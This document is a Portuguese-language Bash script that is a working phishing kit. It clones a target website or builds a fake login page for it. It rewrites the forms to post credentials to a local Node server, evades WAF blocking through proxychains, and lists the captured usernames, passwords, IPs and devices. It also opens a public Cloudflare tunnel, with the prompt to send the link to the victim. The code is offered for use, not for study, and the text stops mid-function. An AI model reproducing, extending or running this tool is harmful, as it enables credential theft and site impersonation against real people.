#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v43 - Clonador Profissional
# 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

if [ ! -f "$SCRIPT_DIR/server/server.js" ]; then
    echo -e "${RED}[ERRO] server.js nao encontrado${NC}"
    exit 1
fi
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
CAPTURED_DIR="$SCRIPT_DIR/captured_sites"
TUNNEL_LOG="$SCRIPT_DIR/.tunnel.log"
SCAN_LOG="$SCRIPT_DIR/.scan_result"

mkdir -p "$CAPTURED_DIR" "$SITE_DIR"

# =============================================
# VERIFICAR NODE.JS
# =============================================
if ! command -v node &>/dev/null; then
    echo -e "${YELLOW}[...] Instalando Node.js...${NC}"
    pkg install -y nodejs 2>/dev/null || { echo -e "${RED}[ERRO] Falha Node.js${NC}"; exit 1; }
fi

# =============================================
# OBTER IP
# =============================================
get_my_ip() {
    local ip=""
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$ip" ] && ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$ip" ] && ip="127.0.0.1"
    echo "$ip"
}

# =============================================
# SCANNER DE SITE (tipo Wappalyzer)
# =============================================
scan_site() {
    local url="$1"
    local use_proxy="${2:-}"
    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 15 --max-time 20"
    
    if [ "$use_proxy" = "y" ]; then
        local pc_conf=""
        [ -f "$HOME/.proxychains/proxychains.conf" ] && pc_conf="$HOME/.proxychains/proxychains.conf"
        [ -z "$pc_conf" ] && [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ] && pc_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
        if [ -n "$pc_conf" ] && command -v proxychains4 &>/dev/null; then
            curl_cmd="proxychains4 -f $pc_conf curl"
        fi
    fi
    
    local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    local html_file="$SCRIPT_DIR/.scan_html"
    $curl_cmd $curl_opts -H "$ua" -H "Accept: text/html,application/xhtml+xml" -o "$html_file" "$url" > "$SCRIPT_DIR/curl.log" 2>&1
    
    [ ! -s "$html_file" ] && { echo "erro#Sem acesso a URL#Verifique a URL ou use proxy###"; return; }
    
    local framework="" cms="" security="" server=""
    
    # Frameworks SPA
    grep -qi '<app-root\|ng-version\|_nghost' "$html_file" && framework="Angular"
    grep -qi '__NEXT_DATA__\|__next\|\/_next\/' "$html_file" && framework="Next.js"
    grep -qi 'data-reactroot\|reactroot\|ReactDOM' "$html_file" && framework="React"
    grep -qi '__VUE__\|_nghost.*vue\|Vue(' "$html_file" && framework="Vue"
    grep -qi 'svelte\|$$app\|\.svelte' "$html_file" && framework="Svelte"
    
    # CMS
    grep -qi 'wp-content\|wp-includes\|/wp-json' "$html_file" && cms="WordPress"
    
    # Server (headers)
    server=$(curl_cmd -sI -k --max-time 10 "$url" 2>/dev/null | grep -iE "Server:|X-Powered-By|x-amz|cloudfront|x-served" | tr -d '\r' | tr '\n' ' ')
    
    # Security/WAF
    local waftest=$(curl_cmd -sI -k --max-time 10 "$url" 2>/dev/null | grep -iE "cf-ray|cloudflare|x-served-by|akamai")
    grep -qi 'cf-browser-verification\|cf-ray' "$html_file" 2>/dev/null && security="Cloudflare"
    grep -qi 'recaptcha\|captcha\|verify you are human\|checking your browser' "$html_file" 2>/dev/null && security="Captcha/WAF"
    [ -z "$security" ] && [ -n "$waftest" ] && security="CDN/Proxy"
    
    # Title
    local title=$(grep -oE '<title>[^<]+</title>' "$html_file" 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
    [ -z "$title" ] && title=$(echo "$url" | sed -E 's|.*://||;s|/$||')
    
    rm -f "$html_file"
    echo "$framework#$cms#$security#$server#$title"
}

# =============================================
# CLONAR SITE
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"
    local use_proxy="${4:-}"

    rm -rf "$SITE_DIR"/*

    local curl_cmd="curl"
    local curl_opts="-s -L -k --connect-timeout 20 --max-time 60"

    if [ "$use_proxy" = "y" ]; then
        local pc_conf=""
        [ -f "$HOME/.proxychains/proxychains.conf" ] && pc_conf="$HOME/.proxychains/proxychains.conf"
        [ -z "$pc_conf" ] && [ -f "/data/data/com.termux/files/home/.proxychains/proxychains.conf" ] && pc_conf="/data/data/com.termux/files/home/.proxychains/proxychains.conf"
        if [ -n "$pc_conf" ] && command -v proxychains4 &>/dev/null; then
            curl_cmd="proxychains4 -f $pc_conf curl"
            echo -e "${GREEN}[Proxy ativo]${NC}"
        else
            echo -e "${YELLOW}[Proxy indisponivel]${NC}"
            use_proxy=""
        fi
    else
        echo -e "${YELLOW}[Sem proxy${NC}"
    fi

    local ua="Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
    local accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    local lang="pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"

    # Detectar redirect
    local final_url=$($curl_cmd -sI -L -k --connect-timeout 15 "$target_url" 2>/dev/null | grep -i "^location:" | tail -1 | sed 's/location: //i' | tr -d '\r')
    if [ -n "$final_url" ] && ! echo "$final_url" | grep -q "$target_url"; then
        echo -e "${YELLOW}[Redirect: $final_url${NC}"
        target_url="$final_url"
    fi

    local base_domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')

    # 1. Baixar HTML
    echo -e "${YELLOW}[1/6] Baixando HTML...${NC}"
    sleep 3
    $curl_cmd $curl_opts --compressed -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: gzip, deflate, br" -H "Cache-Control: no-cache" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo -e "${RED}[X] Falha ao baixar (arquivo vazio)${NC}"
        local err=$(tail -3 "$SCRIPT_DIR/curl.log" 2>/dev/null | head -1)
        [ -n "$err" ] && echo -e "  ${RED}$err${NC}"
        return 1
    fi

    # Charset
    local ct=$(file -bi "$SITE_DIR/index.html" 2>/dev/null | grep -oE 'charset=[^;]+' || echo "")
    if ! echo "$ct" | grep -qi "utf-8"; then
        iconv -f ISO-8859-1 -t UTF-8 "$SITE_DIR/index.html" 2>/dev/null > "$SITE_DIR/.tmp.html" && mv "$SITE_DIR/.tmp.html" "$SITE_DIR/index.html" 2>/dev/null
    fi

    # Detectar bloqueio
    if grep -qiE 'cf-browser-verification|Just a moment|enable JavaScript|Verify you are human|Access denied|Forbidden|Your IP has been blocked|checking your browser' "$SITE_DIR/index.html" 2>/dev/null; then
        echo -e "${RED}  [WAF] Site bloqueou acesso!${NC}"
        echo -e "  ${YELLOW}-> Tente com proxy (opcao 9)${NC}"
        rm -f "$SITE_DIR/index.html"
        return 1
    fi

    local html_size=$(wc -c < "$SITE_DIR/index.html")

    # Detectar tecnologia
    local is_spa=0 spa_type=""
    grep -qiE '<app-root|_nghost|ng-version' "$SITE_DIR/index.html" && is_spa=1 spa_type="Angular"
    grep -qiE '__NEXT_DATA__|__next' "$SITE_DIR/index.html" && is_spa=1 spa_type="Next.js"
    grep -qiE 'data-reactroot|reactroot' "$SITE_DIR/index.html" && is_spa=1 spa_type="React"
    grep -qiE 'vue-router|vue.min|Vue\.' "$SITE_DIR/index.html" && is_spa=1 spa_type="Vue"
    local tech_title=$(grep -oE '<title>[^<]+</title>' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
    [ -z "$tech_title" ] && tech_title=$(echo "$target_url" | sed -E 's|.*://||;s|/$||')

    if [ "$is_spa" = "1" ]; then
        echo -e "  Tech: ${RED}$spa_type (SPA)${NC}"
        echo -e "  Titulo: $tech_title"
        echo -e "  HTML: ${html_size} bytes"
        echo -e "  ${RED}-> Site 100% JS. Clone real NAO e possivel.${NC}"
        echo -e "  ${YELLOW}-> Gerando pagina fake funcional${NC}"

        $curl_cmd $curl_opts -s -o "$SITE_DIR/favicon.png" "${base_domain}/favicon.ico" 2>/dev/null
        local logo_url=$(grep -oE 'src="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/src="//;s/"//')
        [ -z "$logo_url" ] && logo_url=$(grep -oE 'href="[^"]*logo[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | head -1 | sed 's/href="//;s/"//')
        if [ -n "$logo_url" ]; then
            echo "$logo_url" | grep -q "^http" || { echo "$logo_url" | grep -q "^//" && logo_url="https:$logo_url" || logo_url="${base_domain}${logo_url}"; }
            $curl_cmd $curl_opts -s -o "$SITE_DIR/logo.png" "$logo_url" 2>/dev/null
        fi

        local main_color=$(grep -oE 'color:\s*#[0-9a-fA-F]{3,8}' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | tail -1)
        [ -z "$main_color" ] && main_color="#4285f4"
        local body_bg=$(grep -oE 'background:\s*#[0-9a-fA-F]{3,8}' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | head -1)
        [ -z "$body_bg" ] && body_bg="#ffffff"
        local accent=$(grep -oE 'background-color:\s*#[0-9a-fA-F]{3,8}' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,8}' | head -1)
        [ -z "$accent" ] && accent="$main_color"
        local txt=$(grep -oE 'color:\s*#[0-9a-fA-F]{3,6}' "$SITE_DIR/index.html" 2>/dev/null | grep -oE '#[0-9a-fA-F]{3,6}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
        [ -z "$txt" ] && txt="#262626"

        # SPA fake page
        cat > "$SITE_DIR/index.html" << 'ENDSPA'
<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Entrar</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:#1a1a1a;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.12);width:100%;max-width:400px;padding:28px 24px}
.l{text-align:center;margin-bottom:16px}
.l img{max-width:130px;max-height:44px;object-fit:contain}
.t{font-size:13px;color:#555;text-align:center;margin-bottom:16px}
form{display:flex;flex-direction:column;gap:10px}
.i{width:100%;padding:11px;border:1px solid #e0e0e0;border-radius:8px;font-size:15px;outline:none;background:#fafafa}
.i:focus{border-color:#4285f4}
.b{width:100%;padding:11px;border:none;border-radius:8px;background:#4285f4;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
.d{display:flex;align-items:center;gap:10px;margin:12px 0;font-size:12px;color:#aaa}
.d::before,.d::after{content:'';flex:1;height:1px;background:#e0e0e0}
.a{background:#fff;border:1px solid #e0e0e0;color:#1a1a1a;font-size:14px;border-radius:8px}
a.f{display:block;text-align:center;margin-top:8px;font-size:12px;color:#4285f4;text-decoration:none}
.foo{text-align:center;margin-top:14px;font-size:11px;color:#999}
</style></head><body>
<div class="c">
<div class="l"><img src="logo.png" alt="" onerror="this.style.display='none'"></div>
<p class="t">Entre na sua conta para continuar</p>
<form method="POST" action="/login">
<input class="i" name="username" type="text" placeholder="Email, telefone ou usuario" required>
<input class="i" name="password" type="password" placeholder="Senha" required>
<button class="b" type="submit">Entrar</button>
</form>
<a class="f" href="#" onclick="return false">Esqueci a senha</a>
<div class="d">ou</div>
<button class="a" onclick="return false">Continuar com Google</button>
<div class="foo">$(date +%Y)</div>
</div></body></html>
ENDSPA
        rm -f "$SITE_DIR"/css_*.css "$SITE_DIR"/js_*.js "$SITE_DIR"/asset_* 2>/dev/null
        echo -e "  ${GREEN}[OK] Pagina fake gerada${NC}"
        local skip_traditional=1
    else
        local skip_traditional=0
    fi

    if [ "$skip_traditional" = "0" ]; then

    # 2. CSS
    echo -e "${YELLOW}[2/6] Baixando CSS...${NC}"
    local css_count=0
    local css_list_file="$SCRIPT_DIR/.css_list"
    grep -oE 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//' > "$css_list_file"
    grep -oE '<link[^>]*href="[^"]*"[^>]*>' "$SITE_DIR/index.html" 2>/dev/null | grep -iE "stylesheet|text/css" | sed -n 's/.*href="\([^"]*\)".*/\1/p' | sort -u >> "$css_list_file"
    sort -u "$css_list_file" -o "$css_list_file"
    while IFS= read -r css_url; do
        [ -z "$css_url" ] && continue
        local css_file="css_${css_count}_$(basename "$css_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        local css_abs=""
        if echo "$css_url" | grep -q "^http"; then css_abs="$css_url"
        elif echo "$css_url" | grep -q "^//"; then css_abs="https:$css_url"
        elif echo "$css_url" | grep -q "^/"; then css_abs="${base_domain}${css_url}"
        else css_abs="${base_domain}/${css_url}"
        fi
        $curl_cmd $curl_opts -H "Accept: text/css,*/*;q=0.1" -H "Referer: ${base_domain}/" -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
        css_count=$((css_count + 1))
    done < "$css_list_file"
    rm -f "$css_list_file"
    echo -e "${GREEN}  -> ${css_count} CSS${NC}"

    # 3. JS
    echo -e "${YELLOW}[3/6] Baixando JS...${NC}"
    local js_count=0
    local js_list_file="$SCRIPT_DIR/.js_list"
    grep -oE 'src="[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//' > "$js_list_file"
    grep -oE 'src="//[^"]*\.js[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's|src="//|https://|' >> "$js_list_file"
    sort -u "$js_list_file" -o "$js_list_file"
    while IFS= read -r js_url; do
        [ -z "$js_url" ] && continue
        local js_file="js_${js_count}_$(basename "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-40)"
        local js_abs=""
        if echo "$js_url" | grep -q "^http"; then js_abs="$js_url"
        elif echo "$js_url" | grep -q "^//"; then js_abs="https:$js_url"
        elif echo "$js_url" | grep -q "^/"; then js_abs="${base_domain}${js_url}"
        else js_abs="${base_domain}/${js_url}"
        fi
        $curl_cmd $curl_opts -o "$SITE_DIR/$js_file" "$js_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
        perl -i -pe "s|\Q${js_url}\E|${js_file}|g" "$SITE_DIR/index.html"
        js_count=$((js_count + 1))
    done < "$js_list_file"
    rm -f "$js_list_file"
    echo -e "${GREEN}  -> ${js_count} JS${NC}"

    # 4. Captura
    echo -e "${YELLOW}[4/6] Configurando captura...${NC}"
    perl -i -pe 's|action="[^"]*"|action="/login"|gi' "$SITE_DIR/index.html"
    perl -i -pe 's|<form\b|<form method="POST" action="/login"|gi' "$SITE_DIR/index.html"

    local domain_plain=$(echo "$base_domain" | sed 's|https\?://||')
    local domain_www="www.${domain_plain}"

    # 5. Assets
    echo -e "${YELLOW}[5/6] Baixando recursos...${NC}"
    local asset_count=0
    > "$SCRIPT_DIR/.assets_list"
    grep -oE '(src|href|action)="https?://[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -d'"' -f2 >> "$SCRIPT_DIR/.assets_list"
    grep -oE '"//[^"]*\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | cut -c3- >> "$SCRIPT_DIR/.assets_list"
    for css_file in "$SITE_DIR"/css_*.css; do
        [ -f "$css_file" ] || continue
        grep -oE 'url\\([^)]*\\.(png|jpg|jpeg|gif|webp|ico|svg|woff2?|ttf|eot)[^)]*\\)' "$css_file" 2>/dev/null | perl -pe 's|url\(||;s|\).*||;s|[" ]||g' >> "$SCRIPT_DIR/.assets_list"
    done
    sort -u "$SCRIPT_DIR/.assets_list" > "$SCRIPT_DIR/.assets_list_sorted"
    while IFS= read -r asset_url; do
        asset_url=$(echo "$asset_url" | sed 's|"||g')
        [ -z "$asset_url" ] && continue
        local asset_file="asset_${asset_count}_$(basename "$asset_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-50)"
        timeout 10 $curl_cmd -s -o "$SITE_DIR/$asset_file" "$asset_url" >> "$SCRIPT_DIR/curl.log" 2>&1 || true
        asset_count=$((asset_count + 1))
    done < "$SCRIPT_DIR/.assets_list_sorted"
    rm -f "$SCRIPT_DIR/.assets_list" "$SCRIPT_DIR/.assets_list_sorted"
    echo -e "${GREEN}  -> ${asset_count} assets${NC}"

    # 6. Substituicao
    echo -e "${YELLOW}[6/6] Substituindo URLs...${NC}"
    local cdn_domains=$(grep -oE 'https://[^./]+\.[^./]+\.com' "$SITE_DIR/index.html" 2>/dev/null | sort -u)

    local my_ip=$(get_my_ip)
    local local_url="http://${my_ip}:${port}"
    local placeholder="___MYLOCALIP___"

    perl -i -pe "s|\Q${base_domain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttps://${domain_plain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttp://${domain_plain}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttps://${domain_www}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|\Qhttp://${domain_www}\E|${placeholder}|g" "$SITE_DIR/index.html"
    perl -i -pe "s|//${domain_plain}/|${placeholder}/|g" "$SITE_DIR/index.html"
    perl -i -pe "s|//${domain_www}/|${placeholder}/|g" "$SITE_DIR/index.html"
    for cdn in $cdn_domains; do
        local cdn_host=$(echo "$cdn" | sed 's|https\?://||')
        perl -i -pe "s|\Q//${cdn_host}\E|${placeholder}|g" "$SITE_DIR/index.html"
        perl -i -pe "s|\Q${cdn_host}\E|${placeholder}|g" "$SITE_DIR/index.html"
        for css_file in "$SITE_DIR"/css_*.css; do
            [ -f "$css_file" ] || continue
            perl -i -pe "s|\Q//${cdn_host}\E|${placeholder}|g" "$css_file"
            perl -i -pe "s|\Q${cdn_host}\E|${placeholder}|g" "$css_file"
        done
    done
    perl -i -pe "s|\Q${placeholder}\E|${local_url}|g" "$SITE_DIR/index.html"
    perl -i -pe 's|<script[^>]*src="https?://connect\.facebook\.net[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
    perl -i -pe 's|<script[^>]*src="https?://platform\.twitter\.com[^"]*"[^>]*></script>||gi' "$SITE_DIR/index.html"
    perl -i -pe "s|http://\Q${my_ip}\E|${local_url}|gi" "$SITE_DIR/index.html"

    local ext_count=$(grep -oE '(src|href)="https?://[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | grep -v 'localhost\|127\.0\.0\.1' | wc -l | tr -d ' ')
    [ "$ext_count" -gt 0 ] && echo -e "${YELLOW}  !! ${ext_count} links externos nao substituidos${NC}"

    echo -e "${GREEN}  -> Pronto${NC}"
    fi

    # Salvar historico
    local site_name=$(echo "$target_url" | sed -E 's|https?://||;s|[^a-zA-Z0-9.]|_|g' | tr '_' '.')
    local ts=$(date +%Y%m%d_%H%M)
    local hist_dir="$CAPTURED_DIR/${site_name}_${ts}"
    mkdir -p "$hist_dir"
    cp -r "$SITE_DIR"/* "$hist_dir"/ 2>/dev/null
    echo "${target_url}|${redirect_url}|${port}|$(date '+%Y-%m-%d %H:%M')|$hist_dir" >> "$SCRIPT_DIR/.history"
    echo "$target_url|$redirect_url" > "$SCRIPT_DIR/.last_url"

    # Matar servidor antigo e iniciar novo
    pkill -9 -f "node.*server.js" 2>/dev/null
    rm -f "$SCRIPT_DIR/.server.pid"
    sleep 2
    if command -v fuser &>/dev/null; then fuser -k "$port/tcp" 2>/dev/null; fi
    sleep 1

    local my_ip=$(get_my_ip)
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
    local pid=$!
    disown "$pid" 2>/dev/null
    echo "$pid" > "$SCRIPT_DIR/.server.pid"
    sleep 3

    if kill -0 "$pid" 2>/dev/null; then
        echo -e "${GREEN}[OK] Servidor rodando! PID: $pid${NC}"
        echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
    else
        echo -e "${RED}[ERRO] Servidor nao subiu (ou caiu)${NC}"
        echo -e "  ${WHITE}Log: $SCRIPT_DIR/server.log${NC}"
        echo -e "  ${WHITE}---${NC}"
        tail -5 "$SCRIPT_DIR/server.log" 2>/dev/null | while read l; do echo -e "  ${RED}$l${NC}"; done
        echo -e "  ${WHITE}---${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"
        echo -n "  Tentar de novo? (s/n): "
        read RETRY
        if echo "$RETRY" | grep -qi "^s"; then
            pkill -9 -f "node.*server.js" 2>/dev/null; sleep 2
            REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
            pid=$!; disown "$pid" 2>/dev/null; echo "$pid" > "$SCRIPT_DIR/.server.pid"; sleep 3
            if kill -0 "$pid" 2>/dev/null; then
                echo -e "${GREEN}[OK] http://${my_ip}:${port}${NC}"
            else
                echo -e "${RED}[ERRO] Falha novamente${NC}"
                cat "$SCRIPT_DIR/server.log" 2>/dev/null
                rm -f "$SCRIPT_DIR/.server.pid"
            fi
        fi
    fi

    echo ""
    echo -e "${YELLOW}Pressione Enter para voltar ao menu...${NC}"
    read dummy
}

# =============================================
# CAPTURAS - FORMATADA
# =============================================
view_capturas() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         CREDENCIAIS CAPTURADAS${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma credencial ainda.${NC}"
    else
        local total=0
        while IFS= read -r line; do
            if echo "$line" | grep -q "CAPTURADO"; then
                total=$((total + 1))
                local dt=$(echo "$line" | grep -oE '20[0-9-]+ [0-9:]+' | head -1)
                echo ""
                echo -e "  ${GREEN}[$total] ${dt}${NC}"
            elif echo "$line" | grep -q "IP:"; then
                local ip=$(echo "$line" | grep -oE 'IP: [0-9.]+' | head -1)
                local dev=$(echo "$line" | grep -oE 'Device: .*' | head -1)
                echo -e "  ${WHITE}$ip${NC} | ${YELLOW}$dev${NC}"
            elif echo "$line" | grep -q "Dados:"; then
                local data=$(echo "$line" | sed 's/^ *//')
                echo -e "  ${WHITE}$data${NC}"
            fi
        done < "$LOG_FILE"
        echo ""
        echo -e "${GREEN}  Total: $total captura(s)${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar${NC}"
    echo -e "${YELLOW}2) Tempo real (Ctrl+C = voltar)${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1) > "$LOG_FILE"; echo -e "${GREEN}[OK]${NC}"; read ;;
        2) tail -n 5 -f "$LOG_FILE" 2>/dev/null || true ;;
    esac
}

# =============================================
# TUNNEL
# =============================================
start_tunnel() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         TUNEL PUBLICO${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor OFF! Use 1) PHISH primeiro.${NC}"
        read; return
    fi
    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor parou.${NC}"
        rm -f "$SCRIPT_DIR/.server.pid"; read; return
    fi

    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  Instale: pkg install cloudflared${NC}"
        read; return
    fi

    [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
    pkill -f cloudflared 2>/dev/null; sleep 1

    echo -e "${YELLOW}[...] Criando tunel...${NC}"
    cloudflared tunnel --url "http://localhost:8080" > "$TUNNEL_LOG" 2>&1 &
    local tunnel_pid=$!
    echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"

    local tunnel_url=""
    for i in 1 2 3 4 5 6 7 8 9 10; do
        sleep 2
        tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
        [ -n "$tunnel_url" ] && break
        echo -ne "\r  Aguardando tunel ${i}0s...  "
  done

  echo ""
  if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
        echo -e "${GREEN}  PRONTO!${NC}"
        echo -e "${GREEN}  Link: ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}  ================================${NC}"
        echo ""
        echo -e "  ${YELLOW}Mande pro alvo!${NC}"
        echo "$tunnel_url" > "$SCRIPT_DIR/.tunnel_link"
    else
        echo -e "${RED}  Tunel falhou!${NC}"
        grep -qi "Error\|forbidden\|rate limit\|1101" "$TUNNEL_LOG" 2>/dev/null && echo -e "  ${RED}Cloudflare: tunel bloqueado (sem conta)${NC}"
        echo -e "  ${YELLOW}Solucao:${NC} cloudflared tunnel login"
        tail -5 "$TUNNEL_LOG" 2>/dev/null
    fi

    echo ""
    echo -e "${YELLOW}1) Parar${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
        rm -f "$SCRIPT_DIR/.tunnel.pid"
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[OK]${NC}"
    fi
}

# =============================================
# HISTORICO
# =============================================
show_history() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         HISTORICO${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.history" ] || [ ! -s "$SCRIPT_DIR/.history" ]; then
        echo -e "${RED}  Sem clones.${NC}"
        read; return
    fi

    local count=0
    local all_entries=()
    while IFS='|' read -r url redirect port timestamp dir; do
        count=$((count + 1))
        all_entries+=("${url}|${redirect}|${port}|${timestamp}|${dir}")
        printf "  ${GREEN}[%02d]${NC} %s\n" "$count" "$url"
        printf "       ${WHITE}%s${NC}\n" "$timestamp"
    done < "$SCRIPT_DIR/.history"

    [ "$count" -eq 0 ] && return

    echo ""
    echo -e "  ${RED}[00]${NC} Voltar"
    echo -n "Escolha: "
    read CHOICE

    [ "$CHOICE" = "00" ] && return
    [ "$CHOICE" = "0" ] && return

    local choice_num=$((10#$CHOICE))
    if [ "$choice_num" -gt 0 ] 2>/dev/null && [ "$choice_num" -le "$count" ]; then
        local idx=$((choice_num - 1))
        local entry="${all_entries[$idx]}"
        IFS='|' read -r u r p ts d <<< "$entry"
        echo ""
        echo -e "${GREEN}  $u${NC}"
        echo "  Porta: $p | $ts"
        echo ""
        echo -e "${YELLOW}1) Reusar${NC}"
        echo -e "${YELLOW}2) Re-clonar${NC}"
        echo -e "${YELLOW}Enter) Voltar${NC}"
        echo -n "> "
        read ACT
        [ -z "$ACT" ] && return

        if [ "$ACT" = "1" ]; then
            rm -rf "$SITE_DIR"/*
            cp -r "$d"/* "$SITE_DIR"/ 2>/dev/null
            local my_ip=$(get_my_ip)
            perl -i -pe "s|http://[0-9.]+:[0-9]+|http://${my_ip}:${p}|g" "$SITE_DIR/index.html"
            cd "$SCRIPT_DIR"
            REDIRECT_URL="$r" PORT="$p" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
            srv_pid=$!; disown "$srv_pid" 2>/dev/null
            echo "$srv_pid" > "$SCRIPT_DIR/.server.pid"
            echo -e "${GREEN}[OK] http://${my_ip}:${p}${NC}"
        elif [ "$ACT" = "2" ]; then
            clone_site "$u" "$r" "$p"
        fi
    fi
}

# =============================================
# LOCALHOST + BROWSER
# =============================================
show_localhost() {
    clear
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo -e "${CYAN}         SERVIDOR LOCAL${NC}"
    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
    echo ""

    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor OFF.${NC}"
        read; return
    fi
    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
    if ! kill -0 "$pid" 2>/dev/null; then
        echo -e "${RED}  Servidor parou.${NC}"
